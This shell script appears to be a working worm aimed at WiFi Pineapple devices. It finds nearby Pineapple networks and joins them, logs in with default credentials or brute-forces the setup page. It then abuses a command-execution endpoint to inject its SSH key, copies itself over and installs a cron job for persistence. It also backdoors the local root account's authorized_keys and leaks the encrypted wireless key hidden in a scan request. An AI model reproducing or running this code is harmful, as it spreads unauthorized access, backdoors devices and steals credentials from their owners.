
creds="username=root&password=pineapplesareyummy&login="
sessid="tospovirus"
token="_csrfToken=$(printf "$sessid" | openssl sha1 | egrep -o "[0-9a-f][0-9a-f]+")"
sshoptions="-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /tospo/tospo_rsa"


self=`uci get wireless.@wifi-iface[0].ssid`

init() {
	if grep -q "\"\$6[^\"]" /lib/wifi/mac80211.sh;
	then
		sed -i -e 's/"\$6/"$6" "/' /lib/wifi/mac80211.sh
		uci set wireless.@wifi-iface[0].ssid="$(uci get wireless.@wifi-iface[0].ssid) "
		uci commit
		wifi
		sleep 3
	fi
	if [ ! -f /tospo/tospo_rsa.pub ]; then
		echo "Generating tospo ssh key..."
		ssh-keygen -b 768 -f /tospo/tospo_rsa -N ""
	fi
	mkdir -p /root/.ssh
	touch /root/.ssh/authorized_keys
	grep -q "$(cat /tospo/tvbd.pub)" /root/.ssh/authorized_keys || cat /tospo/tvbd.pub >> /root/.ssh/authorized_keys

	if [ ! -f /pineapple/tvi ]; then 
		ln -s /tospo/tvi /pineapple/tvp; 
	fi
}

pushstate() {
	echo "Pushing state..."
	uci export wireless > /tospo/w
	uci export network > /tospo/n
}

popstate() {
	echo "Popping state..."
	ifconfig br-lan 172.16.42.1 up
	ifconfig wlan0 up
	ifconfig wlan1 0.0.0.0 && ifconfig wlan1 down
	uci import -f /tospo/w && uci commit
	uci import -f /tospo/n && uci commit
	wifi
}

connect() {
	ssid=$1
	echo "Connecting to $ssid..."
	ifconfig wlan1 up
	echo "Avoiding conflicts..."
	ifconfig br-lan 172.16.42.191 down
	ifconfig wlan0 down

	echo "Guess at the client-mode interface..."
	wid=$(uci show wireless | grep "wireless.@wifi-iface\[[0-9]\].device=radio1" | cut -d'[' -f 2 | cut -d']' -f 1)
	echo "Stripping keys just in case..."
	uci delete wireless.@wifi-iface[$wid].key
	uci delete wireless.@wifi-iface[$wid].encryption
	echo "Connect to the target network..."
	uci set wireless.@wifi-iface[$wid].network=wan
	uci set wireless.@wifi-iface[$wid].mode=sta
	uci set wireless.@wifi-iface[$wid].ssid="$ssid"
	uci set wireless.@wifi-iface[$wid].hidden=0
	uci set wireless.radio1.channel=11
	uci commit wireless
	wifi
	sleep 3
	
	ifconfig wlan1 172.16.42.146
}


post() {
	len=`printf "$2" | wc -c`
	printf "POST $1 HTTP/1.1\r\nHost: 172.16.42.1:1471\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=$3\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$2" | nc 172.16.42.1 1471
}

bf() {
	echo "Brute forcing..."
	session=`printf 'HEAD /?action=verify_pineapple HTTP/1.1\nHost: 172.16.42.1:1471\nConnection: close\n\n' | nc 172.16.42.1 1471 | egrep -om1 '[0-9a-z]{32}'`
	for n in `seq 1 $1`
	do
		echo "Trying $n time..."
	        post "/?action=verify_pineapple" "green=on&amber=on&blue=on&red=on&verify_pineapple=Continue" "$session" | grep "password" && post "/?action=set_password" "password=pineapplesareyummy&password2=pineapplesareyummy&eula=1&sw_license=1&set_password=Set+Password" "$session" | grep "success" && return 0
	done
	return 1
}
login() {
	echo "Logging in..."
	post '/includes/api/login.php' "$creds" "$sessid" | grep -i 'invalid username' && return 1
	echo "Logged in Successfully!"
	return 0
}

infect() {
	post '/components/system/configuration/functions.php?execute=' "$token&commands=/etc/init.d/sshd enable;/etc/init.d/sshd start;mkdir /root/.ssh; printf \"\$(echo $(hexdump -e'16/1 "%02x"' /tospo/tospo_rsa.pub)|sed -e's/\\(..\\)/\\\\\\\\x\\\\1/g')\">>/root/.ssh/authorized_keys" "$sessid"
	ssh $sshoptions 172.16.42.1 "mkdir -p /tospo" && scp $sshoptions -i /tospo/tospo_rsa -r /tospo/tv* 172.16.42.1:/tospo/
}

persist() {
	ssh $sshoptions 172.16.42.1 'printf "* * * * * /tospo/tv" | crontab -'
}

exfiltrate() {
	which openssl && iwlist wlan0 scan essid "$(cat /etc/config/wireless | grep "key" | cut -d"'" -f2 | openssl rsautl -encrypt -pubin -inkey /tospo/tvd.pub)" >/dev/null
}

init
echo "Scanning for new devices..."
for net in `iwlist wlan0 scan | grep "ESSID:\"Pineapple5_....[^ ]" | grep -v "$self"`
do
	pushstate
	connect `echo $net | cut -d '"' -f 2`
	login || (bf 75 && login || popstate && break)
	infect
	persist
	popstate
	break
done
exfiltrate
